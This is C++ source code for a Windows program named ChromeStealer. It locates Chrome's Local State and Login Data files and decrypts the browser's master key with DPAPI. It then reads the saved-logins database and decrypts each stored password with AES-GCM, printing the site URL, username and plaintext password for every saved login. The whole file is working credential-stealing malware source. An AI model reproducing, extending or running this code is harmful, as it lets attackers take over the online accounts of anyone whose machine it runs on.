#include "ChromeStealer.h"


//Check if WIndows system
#ifdef _WIN32

// Finds the path to the Local State file.
// This function retrieves the user's profile path and constructs the path to
// the Local State file used by Google Chrome.
// @return The path to the Local State file as a wide string.
std::wstring FindLocalState() {
  WCHAR userProfile[MAX_PATH];
  HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);

  if (!SUCCEEDED(result)) {
    warn("Error getting user path. Error: %ld", GetLastError());
    return L"";
  }

  WCHAR localStatePath[MAX_PATH];
  _snwprintf_s(localStatePath, MAX_PATH, _TRUNCATE, L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", userProfile);
  okay("Full path to Local State file: %ls", localStatePath);
  return std::wstring(localStatePath);
}

// Finds the path to the Login Data file.
// This function retrieves the user's profile path and constructs the path to
// the Login Data file used by Google Chrome.
// @return The path to the Login Data file as a wide string.
std::wstring FindLoginData() {
  WCHAR userProfile[MAX_PATH];
  HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);

  if (!SUCCEEDED(result)) {
    warn("Error getting user path. Error: %ld", GetLastError());
    return L"";
  }

  WCHAR loginDataPath[MAX_PATH];
  _snwprintf_s(loginDataPath, MAX_PATH, L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", userProfile);
  okay("Full path to Login Data file: %ls", loginDataPath);
  return std::wstring(loginDataPath);
}

// Retrieves the encrypted key from the Local State file.
// This function reads the Local State file in JSON format and extracts the
// encrypted key used by Google Chrome.
// @param localStatePath The path to the Local State file.
// @return The encrypted key as a string.
std::string getEncryptedKey(const std::wstring& localStatePath) {
  std::ifstream file(localStatePath);
  if (!file.is_open()) {
    warn("Error opening the file. Error: %ld", GetLastError());
    return "";
  }
  json localState = json::parse(file);
  file.close();

  auto itOsEncrypt = localState.find("os_crypt");
  if (itOsEncrypt == localState.end() || !itOsEncrypt.value().is_object()) {
    warn("Key os_crypt not found or not an object.");
    return "";
  }
  okay("Key os_crypt found.");

  auto itEncryptedKey = itOsEncrypt.value().find("encrypted_key");
  if (itEncryptedKey == itOsEncrypt.value().end()) {
    warn("Key encrypted_key not found or not an object");
    return "";
  }

  okay("Key encrypted_key found");
  std::string encryptedKey = itEncryptedKey.value();
  okay("Value at key encrypted_key: %s", encryptedKey.c_str());

  return encryptedKey;
}

// Decrypts an encrypted key using the CryptUnprotectData function.
// This function decodes a Base64-encoded string and decrypts it to retrieve
// the original key.
// @param encrypted_key The encrypted key as a Base64-encoded string.
// @return The decrypted key as a DATA_BLOB structure.
DATA_BLOB decryptKey(const std::string encrypted_key) {
  if (encrypted_key.empty()) {
    warn("Input string is empty.");
    return {};
  }

  DWORD decodedBinarySize = 0;
  if (!CryptStringToBinaryA(encrypted_key.c_str(), 0, CRYPT_STRING_BASE64, NULL, &decodedBinarySize, NULL, NULL)) {
    warn("Error decoding Base64 string first step. Error: %ld\n", GetLastError());
    return {};
  }

  if (decodedBinarySize == 0) {
    warn("Decoded binary size is zero.");
    return {};
  }

  std::vector<BYTE> decodedBinaryData(decodedBinarySize);
  if (!CryptStringToBinaryA(encrypted_key.c_str(), 0, CRYPT_STRING_BASE64, decodedBinaryData.data(), &decodedBinarySize, NULL, NULL)) {
    warn("Error decoding Base64 string second step. Error: %ld\n", GetLastError());
    return {};
  }

  if (decodedBinaryData.size() < 5) {
    warn("Decoded binary data size is too small.\n");
    return {};
  }
  decodedBinaryData.erase(decodedBinaryData.begin(), decodedBinaryData.begin() + 5);

  DATA_BLOB DataInput;
  DATA_BLOB DataOutput;

  DataInput.cbData = static_cast<DWORD>(decodedBinaryData.size());
  DataInput.pbData = decodedBinaryData.data();

  if (!CryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput)) {
    warn("Error decrypting data. Error %ld", GetLastError());
    LocalFree(DataOutput.pbData);
    return {};
  }
  info("The decrypted data is: %s", DataOutput.pbData);

  return DataOutput;
}

// Parses the Login Data file to extract and decrypt login credentials.
// This function opens the Login Data SQLite database, executes a query to retrieve login
// credentials, and decrypts the passwords using the provided decryption key.
// @param loginDataPath The path to the Login Data file.
// @param decryptionKey The key used to decrypt the login data.
// @return An integer indicating success (0) or failure (non-zero).
int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey) {
  sqlite3* loginDataBase = nullptr;
  int openingStatus = 0;

  std::wstring copyLoginDataPath = loginDataPath;
  copyLoginDataPath.append(L"a");

  if (!CopyFileW(loginDataPath.c_str(), copyLoginDataPath.c_str(), FALSE)) {
    warn("Error copying the file. Error: %ld", GetLastError());
    return EXIT_FAILURE;
  }

  using convert_type = std::codecvt_utf8<wchar_t>;
  std::wstring_convert<convert_type, wchar_t> converter;
  std::string string_converted_path = converter.to_bytes(copyLoginDataPath);

  openingStatus = sqlite3_open_v2(string_converted_path.c_str(), &loginDataBase, SQLITE_OPEN_READONLY, nullptr);

  if (openingStatus) {
    warn("Can't open database: %s", sqlite3_errmsg(loginDataBase));
    sqlite3_close(loginDataBase);

    if (!DeleteFileW(copyLoginDataPath.c_str())) {
      warn("Error deleting the file. Error: %ld", GetLastError());
      return EXIT_FAILURE;
    }

    return openingStatus;
  }

  const char* sql = "SELECT origin_url, username_value, password_value, blacklisted_by_user FROM logins";
  sqlite3_stmt* stmt = nullptr;
  openingStatus = sqlite3_prepare_v2(loginDataBase, sql, -1, &stmt, nullptr);

  if (openingStatus != SQLITE_OK) {
    warn("SQL error: %s", sqlite3_errmsg(loginDataBase));
    sqlite3_close(loginDataBase);

    if (!DeleteFileW(copyLoginDataPath.c_str())) {
      warn("Error deleting the file. Error: %ld", GetLastError());
      return EXIT_FAILURE;
    }

    return openingStatus;
  }

  okay("Executed SQL Query.");

  while ((openingStatus = sqlite3_step(stmt)) == SQLITE_ROW) {
    const unsigned char* originUrl = sqlite3_column_text(stmt, 0);
    const unsigned char* usernameValue = sqlite3_column_text(stmt, 1);
    const void* passwordBlob = sqlite3_column_blob(stmt, 2);
    int passwordSize = sqlite3_column_bytes(stmt, 2);

    int blacklistedByUser = sqlite3_column_int(stmt, 3);

    if (originUrl != NULL && originUrl[0] != '\0' &&
      usernameValue != NULL && usernameValue[0] != '\0' &&
      passwordBlob != NULL && blacklistedByUser != 1) {

      unsigned char iv[IV_SIZE];
      if (passwordSize >= (IV_SIZE + 3)) {
        memcpy(iv, (unsigned char*)passwordBlob + 3, IV_SIZE);
      }
      else {
        warn("Password size too small to generate IV");
        continue;
      }

      if (passwordSize <= (IV_SIZE + 3)) {
        warn("Password size too small");
        continue;
      }

      BYTE* Password = (BYTE*)malloc(passwordSize - (IV_SIZE + 3));
      if (Password == NULL) {
        warn("Memory allocation failed");
        continue;
      }
      memcpy(Password, (unsigned char*)passwordBlob + (IV_SIZE + 3), passwordSize - (IV_SIZE + 3));

      unsigned char decrypted[1024];
      passwordDecrypter(Password, passwordSize - (IV_SIZE + 3), decryptionKey.pbData, iv, decrypted);
      decrypted[passwordSize - (IV_SIZE + 3)] = '\0';

      printf("[+] Origin URL: %s\n", originUrl);
      printf("[+] usernameValue: %s\n", usernameValue);
      printf("[+] Password: %s\n", decrypted);

      free(Password);

      printf("\n-----------\n");
    }
  }

  if (openingStatus != SQLITE_DONE) {
    warn("SQL error or end of data: %s", sqlite3_errmsg(loginDataBase));
    sqlite3_finalize(stmt);
    sqlite3_close(loginDataBase);

    if (!DeleteFileW(copyLoginDataPath.c_str())) {
      warn("Error deleting the file. Error: %ld", GetLastError());
      return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
  }
}

// Decrypts a password using the provided key and initialization vector (IV).
// This function uses the libsodium library to decrypt the ciphertext.
// @param ciphertext The encrypted password.
// @param ciphertext_len The length of the encrypted password.
// @param key The key used for decryption.
// @param iv The initialization vector used for decryption.
// @param decrypted The buffer to store the decrypted password.
void passwordDecrypter(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted) {
  unsigned long long decrypted_len;

  if (sodium_init() < 0) {
    fprintf(stderr, "Failed to initialize libsodium\n");
    return;
  }

  int result = crypto_aead_aes256gcm_decrypt(
    decrypted, &decrypted_len,
    NULL,
    ciphertext, ciphertext_len,
    NULL, 0,
    iv, key
  );

  if (result != 0) {
    fprintf(stderr, "Decryption failed\n");
  }
  else {
    decrypted[decrypted_len] = '\0';
  }
}

int main() {
#ifdef _WIN32
  std::wstring localStatePath = FindLocalState();
  std::wstring loginDataPath = FindLoginData();

  std::string encryptedKey = getEncryptedKey(localStatePath);
  DATA_BLOB decryptionKey = decryptKey(encryptedKey);

  int parser = loginDataParser(loginDataPath, decryptionKey);
  LocalFree(decryptionKey.pbData);

  system("pause");
  return EXIT_SUCCESS;
#else
  warn("This program only runs on Windows systems.\n");
  return EXIT_FAILURE;
#endif
}

#endif // _WIN32
